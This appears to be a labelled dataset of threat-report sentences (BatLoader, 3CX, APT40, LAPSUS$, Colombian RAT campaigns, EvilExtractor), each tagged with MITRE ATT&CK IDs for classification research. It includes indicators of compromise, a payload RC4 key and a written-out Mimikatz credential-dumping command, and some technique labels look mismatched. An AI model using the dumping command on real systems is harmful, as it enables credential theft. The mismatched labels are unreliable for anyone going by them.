"Figure 36: Contents of requestadmin.bat The scripttodo.ps1 file still retrieves the same files from the C2, the Cobalt Strike payload (d655) was changed to a DLL instead of EXE and shutdowni.bat is no longer pulled from the C2.",T1105
"user.ps1 (Figure 37) is similar to scriptodo.ps1 in terms of enumerating the current domain of the host, username, and ARP table.","T1033, T1016"
"If the conditions are not met and the host belongs to the workgroup, the script retrieves the Cobalt Strike payload named installv2.dll (MD5: 4a6898a4584fdfb34bbeefc77bc882c4) and runs it via rundll32.exe with an ordinal “SRANdomsrt”.","T1105, T1218.011"
Figure 37: Contents of the user.ps1 Another new addition to BatLoader is the antivirus check script (checkav.ps1).,T1518.001
The script checks the host against the list of antiviruses and sends it out to C2 server (Figure 38).,T1518.001
"Appendix https://www.mandiant.com/resources/blog/seo-poisoning-batloader-aterahttps://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls?redirectedfrom=MSDNhttps://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/https://www.0ffset.net/reverse-engineering/challenge-1-gozi-string-crypto/https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.htmlhttps://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-mars-stealerhttps://www.secureworks.com/404?aspxerrorpath=/research/gozihttps:/www.secureworks.com/research/gozihttps://owasp.org/www-community/attacks/Man-in-the-browser_attack Indicators of Compromise Name Indicators BatLoader C2 updatea1[.]com BatLoader C2 externalchecksso[.]com BatLoader C2 internalcheckssso[.]com Ursnif C2 weiqeqwns[.]com Ursnif C2 > wdeiqeqwns[.]com Ursnif C2 weiqeqwens[.]com Ursnif C2 weiqewqwns[.]com Ursnif C2 iujdhsndjfks[.]com Ursnif C2 trackingg-protectioon.cdn1.mozilla[.]net Ursnif C2 45.8.158[.]104 Ursnif C2 188.127.224[.]114 Ursnif C2 siwdmfkshsgw[.]com Vidar Stealer t[.]me/trampapanam Ursnif C2 Ijduwhsbvk[.]com Vidar Stealer nerdculture[.]de/@yoxhyp SystemBC C2 hgfiudtyukjnio[.]com SystemBC C2(overlaps with Ursnif C2 ISP) 188.127.224[.]46 Cobalt Strike C2 139.60.161[.]74 Redline C2 176.113.115[.]10 MITRE ATT&CK MITRE ATT&CK Tactic ID MITRE ATT&CK Technique Description MITRE ATT&CK Tactic Initial Access ID T1189 MITRE ATT&CK Technique Drive-by Compromise Description BatLoader is delivered via fake software installers MITRE ATT&CK Tactic User Execution ID T1204.002 MITRE ATT&CK Technique Malicious File Description The user launches the malicious MSI file MITRE ATT&CK Tactic Persistence ID T1547.001 MITRE ATT&CK Technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Description As a result of BatLoader infection, ISFB malware creates the persistence via Registry Run Keys.",T1547.001
Syncro RMM can also be used as a persistence mechanism MITRE ATT&CK Tactic Defense Evasion ID T1562.001 MITRE ATT&CK Technique Impair Defenses:,T1219
"Disable or Modify Tools Description Disabling Windows Defender notifications, Task Manager and Command Prompt MITRE ATT&CK Tactic Process Injection ID T1055 Description ISFB injects itself into explorer.exe as a result of successful BatLoader infection MITRE ATT&CK Tactic Unsecured Credentials ID T1552.001 MITRE ATT&CK Technique Unsecured Credentials: Credentials In Files Description The ISFB version observed is capable of accessing browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords.","T1552.001, T1562.001, T1055"
"In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victim’s own network.",T1078
"Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.",T1078
"This led our responders to identify the occurrence of “credential hopping,” where the threat actor leveraged different credentials for each step while moving laterally through the victim’s network.",T1078
Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account.,"T1021.001, T1078"
"From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrator’s account.","T1021.001, T1078"
Log in to O365 as a user with privileged access to cloud resources.,T1078
"However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.",T1078
"But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike? Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.",T1078
"The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.","T1570, T1078"
"The user-specific encryption keys for DPAPI are stored under C:\Users\<user>\AppData\Roaming\Microsoft\Protect\. To leverage these encryption keys, the threat actor must first decrypt them, either by using the user account’s Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.",T1140
"Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the user’s DPAPI key.",T1140
The decryption of the cookies is believed to have taken place offline after exfiltrating the data via the clipboard in the threat actor’s RDP session.,"T1140, T1021.001"
"Representation of lateral movement to cookie theft to O365 authentication CrowdStrike identified a similar TTP where the threat actor connected via RDP to a user’s workstation with the workstation owner’s account (e.g., connecting via RDP to user1-pc using the account user1).",T1021.001
"After this, the threat actor navigated to the user’s Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the user’s Chrome history intact.",T1070.004
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments.,T1078
This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.,T1078
"Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.",T1078
TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.,"T1071.001, T1047, T1036.005"
"TrailBlazer WMI Persistence In the obfuscated example above, TrailBlazer (<FILENAME>.exe) would be executed when the system’s uptime was between 180 and 480 seconds.",T1047
GoldMax (Linux variant) Attempted to blend in with a file name that matched the system name it resided on Configured for persistence via a crontab entry with a @reboot line Used likely compromised infrastructure for C2 GoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks.,T1036.005
"With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.","T1564.001, T1036.005"
"In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.",T1083
The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.,"T1021.001, T1078"
CrowdStrike observed the threat actor accessing the wiki as users who would be considered “non-privileged” from an Active Directory perspective but had access to sensitive data specific to the victim’s products or services.,T1078
"CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.",T1021.001
"Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victim’s O365 tenant and began performing enumeration queries.",T1078
"C:\Users\<user>\AppData\Local\Microsoft\AzureAD\Powershell\. While the logs didn’t include what data was returned by the queries, they did provide some insight such as the user account used to connect to the victim’s O365 tenant (which was not the same as the user the threat actor used to RDP to the vCenter server).","T1021.001, T1078"
"The commands included enumeration queries such as: ListAccountSkus ListPartnerContracts ListServicePrincipals ListServicePrincipalCredentials ListRoles ListRoleMembers ListUsers ListDomains GetRoleMember GetPartnerInformation GetCompanyInformation In this case, however, the most significant and concerning log entry was one that indicated the command AddServicePrincipalCredentials was executed.",T1033
"By running the commands from within the victim’s environment, MFA requirements were bypassed due to conditional access policies not covering Service Principal sign-ins at this point of time.8 However, as explained earlier, the threat actor managed to continue to access the victim’s cloud environment even when the victim enforced MFA for all connections regardless of source.",T1078
"While the bulk of the evidence for this activity came from the text-based O365 PowerShell logs, the NTUSER.DAT registry hive for the user that was running the PowerShell cmdlets also included information on the accounts that were used to authenticate to the cloud.",T1078
"Attacker-created Service Principal First, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name.",T1078
Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe.,T1057
"As tasklist uses WMI “under the hood,” this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.",T1047
"Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.",T1057
"Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.",T1057
"While unproven, it’s possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.",T1057
"However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victim’s environment.",T1078
"After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.",T1078
"The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.",T1078
"In one example, the threat actor connected into the victim’s environment via a VPN endpoint that did not have MFA enabled.",T1078
"Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.","T1570, T1021.001"
One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.,T1003.001
"While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.",T1027
"In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.",T1036.005
Tactic Technique Observable Credential Access T1003.006 OS Credential Dumping: DCSync The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals Credential Access T1003.001: OS Credential Dumping: LSASS Memory The threat actor used a heavily obfuscated PowerShell script to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory and encrypt the output Initial Access / Persistence T1078.003: Valid Accounts: Local Accounts A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment Initial Access / Persistence T1133:,"T1027, T1003.001, T1078"
"Remote Desktop Protocol The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system Initial Access, Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor used accounts with Delegated Administrator rights to access other O365 tenants.","T1021.001, T1078"
The Threat actor also used valid accounts to create persistence within the environment.,T1078
"Masquerading: Match Legitimate Name or Location The threat actor renamed their utilities to masquerade as legitimate system binaries (AdFind as svchost.exe), match the system’s role (GoldMax), or appear legitimate (TrailBlazer as an apparent Adobe utility).",T1036.005
"Additionally, the threat actor renamed their systems prior to connecting to victim’s VPNs to match the victim’s system naming convention Discovery T1087.002: Account Discovery: Domain Account T1482: Domain Trust Discovery T1069.002: Permission Groups Discovery: Domain Groups The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory Defense Evasion / Lateral Movement T1550.001:",T1036.005
Additional Cloud Credentials The threat actor added credentials to O365 Service Principals Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor created new O365 Service Principals to maintain access to victim’s environments Discovery T1057: Process Discovery The threat actor regularly interrogated other systems using tasklist.exe Reconnaissance T1595.001:,"T1057, T1078"
"When 3CXDesktopApp starts, it sideloads the compromised ffmpeg.dll, which in turn decodes the embedded shellcode from d3dcompiler_47.dll and loads it.",T1140
The shellcode accesses a GitHub repository and brings down icon files which contain encrypted C2 strings that the shellcode then decrypts and communicates to.,"T1027, T1140"
3CXDesktopApp.exe is the legitimate VOIP desktop application and is abused for side loading “ffmpeg.dll”.,T1574.002
"File Type MD5 SHA256 DLL PE 64bits ffmpeg.dll 27B134AF30F4A86F177DB2F2555FE01D C485674EE63EC8D4E8FDE9800788175A8B02D3F9416D0E763360FFF7F8EB4E02 DLL PE 64bits D3dcompiler_47.dll 82187AD3F0C6C225E2FBA0C867280CC9 11BE1803E2E307B647A8A7E02D128335C448FF741BF06BF52B332E0BBF423B03 Table.2 Initial dropped samples Once “ffmpeg.dll” is loaded, it tries to enumerate the current directory for the second DLL “d3dcompiler_47.dll”.",T1083
Fig.2 ffmpeg enumerating current directory,T1083
The “d3dcompiler_47.dll” DLL has an encrypted payload embedded in it.,T1027
Fig.3 Embedded encrypted payload,T1027
After the identification of the encrypted payload.,T1027
“ffmpeg.dll” will try to decrypt it using the RC4 encryption scheme with the key “3jB(2bsG#@c7”.,T1140
Fig.4 RC4 decryption The decrypted payload is shown below.,T1140
Fig.5 Decrypted payload The decrypted payload that is going to be executed contains another embedded DLL as shown below.,T1140
Fig.6 Dll loading by encrypted payload Second Stage Analysis The embedded DLL will mainly try to fetch malicious “ico” files from the GitHub Repository “https://raw[.]githubusercontent[.]com/IconStorages/images/main/icon%d[.]ico”.,T1027
The repository contains multiple icon files that have Base64 and AES encrypted C2’s appended to them.,T1573.001
"Fig.9 SQL queries for collection The info stealer also collects information on infected hosts, such as domain name, Hostname and OS Version, using NetWkstaGetInfo() API.","T1106, T1005, T1082"
The 3cxIngectionHunter script will simply crawl the filesystem looking for instances of the infected ffmpeg.dll file and report back if there is a match to the malicious hash.,T1083
The malicious installation package contains an infected dll library that decrypts a shellcode from the d3dcompiler_47.dll library’s overlay and executes it.,T1140
The decrypted payload extracts C2 server URLs from icons stored in a GitHub repository (the repository is removed).,T1140
"The payload connects to one of the C2 servers, downloads an infostealer and starts it.",T1105
"The infostealer collects system information and browser history, then sends it to the C2 server.",T1041
"We found out that the threat actor specifically targeted cryptocurrency companies, dropping the following files on infected machines: C:\Windows\system32\wlbsctrl.dll, a malicious library (MD5: 9f85a07d4b4abff82ca18d990f062a84); C:\Windows\System32\config\TxR\<machine hardware profile GUID>.TxR.0.regtrans-ms, an encrypted shellcode payload.",T1027
"We further saw DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded into spoolsv.exe and svchost.exe, respectively.",T1574.002
The wlbsctrl.dll library is responsible for decrypting and executing the shellcode stored in the C:\Windows\System32\config\TxR directory.,T1140
The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine.,T1106
This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines.,T1140
Connect Connects to a given host via a socket and waits for the server to send data.,T1095
"Registry Manipulates registry (lists, adds, deletes and exports keys).",T1112
"Service Manipulates (creates, lists, starts, stops and deletes) services.",T1543.003
Inject Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread.,T1055
The driver collects information about installed AV filters and writes it to the C:\Windows\System32\catroot2\edb.chk.log file.,T1518.001
Update Encrypts a provided payload,T1027
"Although the tools themselves are not malicious, APT 40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity.",T1105
"[G0065] has used a variety of tactics and techniques and a large library of custom and open-source malware—much of which is shared with multiple other suspected Chinese groups—to establish initial access via user and administrator credentials, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data.","T1005, T1078"
[T1133] Spearphishing emails with malicious attachments [T1566.001] and links [T1566.002] Drive-by compromises,T1566.001
[T1189] and exploitation of public-facing applications [T1190] Access to valid,"T1190, T1078"
"[T1078], compromised administrative [T1078.001] accounts Execution",T1078
[T1203] using lure documents that dropped malware exploiting various Common Vulnerabilities and Exposures (CVEs),T1204.002
User execution,T1204.002
[T1204] of malicious files [T1204.002] and links,T1204.002
"[T1566.002] attached to spearphishing emails [T1566.001] Persistence [TA0003], Privilege Escalation [TA0004], Credential Access",T1566.001
"[TA0011], Collection [TA0009], and Exfiltration [TA0010] Use of steganography [T1027.003] to hide stolen data inside other files stored on GitHub Protocol impersonation",T1027
[T1001.003] by using Application Programming Interface (API) keys for Dropbox accounts in commands to upload stolen data to make it appear that the activity was a legitimate use of the Dropbox service Protocol tunneling [T1572] and multi-hop proxies,T1090
"[T1090.003], including the use of Tor [S0183] Use of domain typosquatting for C2 infrastructure [T1583.001] Archive [T1560], encrypt [T1532], and stage collected data locally",T1074.001
[T1074.001] and remotely [T1074.002] for exfiltration Exfiltration over C2 channel [T1041] MitigationsNetwork Defense-in-Depth Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk.,T1041
"Network device management interfaces—such as Telnet, Secure Shell (SSH), Winbox, and HTTP—should be turned off for wide area network (WAN) interfaces and secured with strong passwords and encryption when enabled.",T1027
They have a large network infrastructure for command and control: ESET observed at least 24 different IP addresses in use in the second half of 2020.,T1090
These are probably compromised devices that act as proxies for their C&C servers.,T1090
"The phishing emails have similar topics and pretend to come from some of the same entities – for example, the Office of the Attorney General (Fiscalia General de la Nacion) or the National Directorate of Taxes and Customs (DIAN).",T1566.001
"However, there are differences in the attachments used for phishing emails, the remote access trojans (RATs) used and in most of the operator’s C&C infrastructure.",T1566.001
"In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.","T1566.001, T1204.002"
The downloaded files are regular RAR archives that have an executable file inside.,T1027
The target has to manually extract the file and execute it for the malware to run.,T1204.002
"We’ve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.","T1027, T1055, T1140"
"There is a PDF file attached that promises a photo of the infraction, as well as information about time and place of the incident.",T1566.001
"After the shortened link is expanded, a RAR archive is downloaded from: http://www.mediafire[.]com/file/wbqg7dt604uwgza/SIMITcomparendoenlineasimitnumeroreferenciaComparendo2475569.uue/file.",T1027
Various phishing emails and their attached files Malicious artifacts Droppers The executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer.,"T1027, T1140"
"To try to evade detection, this installer contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious: an encrypted RAT executable and a DLL file that decrypts and runs the trojan.",T1027
NSIS script for one of the droppers; the malicious files are highlighted The files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument.,T1218.011
"In the vast majority of cases these NSIS droppers decrypt and run the Remcos RAT, but we have also seen cases where the payload is njRAT.",T1140
Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.,T1027
"Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.","T1027, T1140"
The result is a DLL that will be loaded and called in the same address space.,T1055
The DLL reads pixels from an image contained in the first binary and decrypts another executable.,"T1027, T1140"
This new executable is packed with CyaX. It reads data from its own resource section and decrypts a payload.,T1027
"There are anti-analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.",T1055
"In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.",T1027
The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.,T1140
"It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.",T1027
"Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.",T1140
"After that, the array is gzip-decompressed and executed.",T1027
The .NET packer known as CyaX is used to perform this task.,T1027
The decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key.,T1140
"Once it’s decrypted, it can be run in the same address space or injected into a different process, depending on the configuration.",T1055
"This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes.","T1562.001, T1518.001"
Part of the main routine for the injection of the payload is shown in Figure 19. Figure 19.,T1055
The payload is read from an encrypted resource and XORed with a hardcoded password.,T1027
The shellcode that performs the injection is contained in an array and is dynamically loaded.,T1055
"droppers For some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.",T1027
"Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.",T1055
It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process.,"T1027, T1055, T1140"
Concatenation of the payload The routine that decrypts the payload contains a small shellcode that is loaded with VirtualAlloc and executed.,T1106
The decryption done by the shellcode is based on a single-byte XOR algorithm.,T1140
Execution of shellcode to decrypt the payload We can see that the shellcode is stored encrypted.,T1140
"In fact, before deobfuscating the script, all strings were encrypted with this same XOR-based algorithm.",T1027
"Routine to decrypt strings Once the payload is decrypted, a shellcode with RunPE code is used to perform the injection.",T1055
Then an Internet Shortcut (.url) file is created in the Startup folder to execute the script.,T1547.001
"It can: Check for VMware and VirtualBox Delete the dropper executable Run the dropper continuously Download and execute files Terminate if a “Program Manager” window is found Read a binary from its resource section, write it to disk and execute it Modify the security descriptor (ACL) for the injected process For more information see this analysis by Morphisec where similar AutoIt droppers were used with Frenchy shellcode.","T1027, T1105, T1070.004"
"These provide several capabilities not only for remote control, but also for spying on targets: keylogging, screen capture, clipboard hijacking, exfiltration of files, and the ability to download and execute other malware, to name a few.","T1041, T1105, T1113, T1056.001"
"That version includes functionalities such as DDoS or ransomware encryption, but only spy features such as keylogging are used by the attackers.",T1056.001
"Another njRAT version used by the attackers is v0.7d (the “green edition”) which is a simpler version focused on spying capabilities: keylogging, taking screenshots, access to webcam and microphone, uploading and downloading files, and executing other binaries.","T1105, T1113, T1056.001"
"As it is highly unlikely that the criminals own so many residential IP addresses, it is possible that they use some victims as proxies, or some vulnerable devices to forward communication to their real C&C servers.",T1090
Spearphishing AttachmentThe attackers have used emails with PDF or RTF files attached that contain a link to download malware.,T1566.001
Windows Command ShellThe attackers have used RATs that can launch a command shell for executing commands. T1106Native,T1059.003
"APIThe attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory.",T1106
T1204.002User Execution: Malicious FileThe attackers have attempted to get users to execute malicious files masquerading as documents. PersistenceT1547.001Boot or Logon Initialization Scripts: Registry Run Keys / Startup,T1204.002
FolderThe attackers have used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder.,T1547.001
T1053.005Scheduled Task/Job: Scheduled TaskThe attackers have used scheduled tasks in their droppers and payloads to achieve persistence.,T1053.005
Privilege EscalationT1548.002Abuse Elevation Control Mechanism: Bypass User Access ControlThe attackers have used RATs that implement UAC bypassing.,T1548.002
Defense EvasionT1140Deobfuscate/Decode Files or InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads.,T1140
"T1562.001Impair Defenses: Disable or Modify ToolsThe attackers have used CyaX packer, which can disable Windows Defender.",T1562.001
File DeletionThe attackers have used malware that deletes itself from the system.,T1070.004
"T1112Modify RegistryThe attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities.",T1112
Software PackingThe attackers have used various layers of packers for obfuscating their droppers.,T1027
SteganographyThe attackers have used packers that read pixel data from images contained in PE files’ resource sections and build the next layer of execution from the data.,T1027
"T1055.002Process Injection: Portable Executable InjectionThe attackers have used droppers that inject the payload into legitimate processes such as RegAsm.exe, MSBuild.exe and more.",T1055
DiscoveryThe attackers have used various RATs that can browse file systems.,T1083
DiscoveryThe attackers have used various RATs with modules that show running processes.,T1057
T1012Query RegistryThe attackers have used various RATs that can read the Registry.,T1012
DiscoveryThe attackers have used droppers that check for security software present in a victim’s computer.,T1518.001
DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection. T1016System Network Configuration DiscoveryThe attackers have used various RATs that can collect the IP address of the victim machine.,"T1016, T1082"
User DiscoveryThe attackers have used various RATs that retrieve the current username during initial infection.,T1033
T1021.001Remote Services: Remote Desktop ProtocolThe attackers have used various RATs that can perform remote desktop access.,T1021.001
"DataThe attackers have used various RATs that can access and modify data from the clipboard. T1005Data from Local SystemThe attackers have used various RATs that can access the local file system and upload, download or delete files.",T1005
KeyloggingThe attackers have used various RATs that have keylogging capabilities.,T1056.001
CaptureThe attackers have used various RATs that can capture screenshots of victim machines.,T1113
"Symmetric CryptographyThe attackers have used Remcos RAT, which uses RC4 for encrypting C&C communications.",T1573.001
T1095Non-Application Layer ProtocolThe attackers have used various RATs that use TCP for C&C communications.,T1095
Over C2 ChannelThe attackers have used various RATs that exfiltrate data over the same channel used for C&C. 12 Jan 2021 - 11:30AM,T1041
Our findings can be summarised as below: Access and scraping of corporate Microsoft SharePoint sites in order to identify any credentials which may be stored in technical documentation.,T1552.001
Access to local password managers and databases to obtain further credentials and escalate privileges.,T1552.001
Cloning of git repositories and extraction of sensitive API Keys.,"T1552.001, T1078"
Using compromised credentials to access corporate VPNs.,T1078
Disruption or destruction to victim infrastructure to hinder analysis and consume defensive resource.,T1078
Lateral Movement In one incident LAPSUS$ were observed to sporadically move through the victim environment via RDP in an attempt to access resources deeper in the victim environment.,T1021.001
"In some instances, victim controlled hostnames were revealed including the host “VULTR-GUEST” which refers to infrastructure hosted on the private cloud service, Vultr[3].",T1082
Exfiltration LAPSUS$’s action on objectives appears to focus on data exfiltration of sensitive information as well as destruction or disruption.,T1005
"Impact NCC Group has observed disruption and destruction to client environments by LAPSUS$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities.",T1070.004
"These credentials are generated and stored in the memory of the LSASS process when a user initiates the interactive logon to the machine such as console logon or RDP, runs a scheduled task or uses remote administration tools.","T1003.001, T1053.005"
The encryption and decryption of credentials is done using LsaProtectMemory and LsaUnProtectMemory respectively and hence a decryption tool using these APIs will be able to decrypt LSASS memory buffers and extract them.,T1140
"Injecting deceptive credentials on production endpoints: Production endpoints should be injected with deceptive credentials at multiple places like LSASS process memory, Credential Manager, browser credentials, etc., to increase the possibility of these credentials being picked up and used to pivot to decoy systems in the network.","T1055, T1078"
"Network Deception – Example 1: Injecting NETONLY credentials into LSASS process memory LSASS process memory is one of the prime targets for attackers, as well as malware armed with lateral movement capabilities since it caches a variety of credentials.","T1003.001, T1055"
Credential extraction from the LSASS process requires opening a read handle to the process itself which is closely monitored by EDR products but there are stealthier ways around it.,T1003.001
One of the primary tasks towards achieving credential-based deception is to stage the deceptive credentials in LSASS process memory.,T1003.001
This can be accomplished on the production and decoy systems by executing a trivial credential injection code which uses the CreateProcessWithLogonW Windows API with the specified crafted credentials.,T1106
The below shows the example code calling the API with the specified credentials which is also visible when credentials are extracted with Mimikatz.,"T1003.001, T1106"
Figure 20 – Injecting credentials into LSASS memory One of the parameters to CreateProcessWithLogonW is “dwLogonFlags” which should be specified as LOGON_NETCREDENTIALS_ONLY as shown in the code above.,T1055
"Below is a code snapshot from credential extraction tool Mimikatz, using a similar approach to forge a logon session and replacing the credentials with the supplied ones while executing Pass-the-Hash attacks.",T1003.001
Figure 21 – Mimikatz code for PTH attack Network Deception – Example 2: Configure deceptive hostnames for decoy VMs Attackers or malware moving laterally inside the network might do a recon for interesting hostnames via nbtstat/nbtscan.,T1082
"For instance, Chrome saves the credentials in the SQLite format on the disk which can be decrypted using DPAPI as discussed earlier sections.",T1140
"Figure 25 – Deception network setup On the occasion where one of the domain-joined or public facing systems is compromised, authentication would be attempted to other domain joined systems in the network.",T1190
Figure 26 – Deceptive credentials usage for authentication in the domain One such example event of successfully logging on to the decoy system is as shown below: Figure 27 – Alert send to administrator on using deceptive credentials MITRE ATT&CK Techniques: Credential theft attacks discussed here are mapped by MITRE as below: Technique ID Technique Name Description T1003.001 LSASS Process Memory Attackers may attempt to access LSASS process memory to extract credentials as it stores a variety of credentials.,T1003.001
Threat actors use this technique to steal the victim’s sensitive data or plant malware — like ransomware or keyloggers — on their victim’s device.,T1056.001
"DoS flood attackIn a DoS flood attack, the attacker uses one computer to flood a remote DNS server with false traffic.",T1071.001
"The attacker orchestrates the attack by directing all devices to send traffic simultaneously to one server, generating a DoS status.",T1071.001
Many people don’t protect their router using a complex password — or just safeguard it using the default factory credentials.,T1078
This attack is typical among ransomware operators for facilitating communication with the Command and Control Center (C&C) and exfiltrating data from the target device.,T1041
"By doing this, each infected device and the remote attacker’s server have created a covert channel that can be used to exfiltrate data from the victim device or deliver more malware, such as ransomware, to the target device.","T1041, T1105"
title: EvilExtractor – All-in-One Stealer url: https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer Affected platforms: WindowsImpacted parties: Any organizationImpact: Controls victim’s device and collects sensitive informationSeverity level: Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices.,T1005
"It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities.",T1036.005
"We recently reviewed a version of the malware that was injected into a victim’s system and, as part of that analysis, identified that most of its victims are located in Europe and America.",T1055
EvilExtractor for sale on the web Initial Access The phishing email with the malicious attachment is shown in Figure 2.,T1566.001
"File header of ""Account_Info.exe"" The execution file is a Python program packaged by PyInstaller.",T1027
"We extracted it with pyinstxtractor and found that the “PYARMOR” string in its main code file “contain.pyc”, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected.",T1027
"It contains Base64-encoded data, which is a PowerShell script.",T1027
"Code for EvilExtractor EvilExtractor After decrypting the pyc file, we get the primary code of EvilExtractor.",T1140
